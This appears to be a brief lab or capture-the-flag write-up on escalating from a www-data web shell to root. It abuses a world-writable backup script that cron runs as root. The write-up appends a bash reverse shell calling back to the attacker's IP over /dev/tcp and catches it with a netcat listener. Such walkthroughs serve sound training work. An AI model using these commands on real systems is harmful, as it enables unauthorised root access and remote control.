Cron job runs world-writable script as root.

### Initial Access
```
# Found web shell on 10.10.10.90
# User: www-data

# Check cron jobs
cat /etc/crontab
# */5 * * * * root /usr/local/bin/backup.sh

# Check script permissions
ls -la /usr/local/bin/backup.sh
# -rwxrwxrwx 1 root root 512 Oct 10 10:00 /usr/local/bin/backup.sh
# World-writable!
```

#### Check Current Script
```
# View current script
cat /usr/local/bin/backup.sh
#!/bin/bash
tar -czf /var/backups/web.tar.gz /var/www/html/
```

#### Inject Reverse Shell
```
# Backup original
cp /usr/local/bin/backup.sh /tmp/backup.sh.orig

# Add reverse shell
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /usr/local/bin/backup.sh

# Wait for cron to run (max 5 minutes)
```

#### Get Root Shell
```
# On attacker
nc -lvnp 4444
# Connection from 10.10.10.90
# root@target:~#

# Restore original script
cp /tmp/backup.sh.orig /usr/local/bin/backup.sh
```

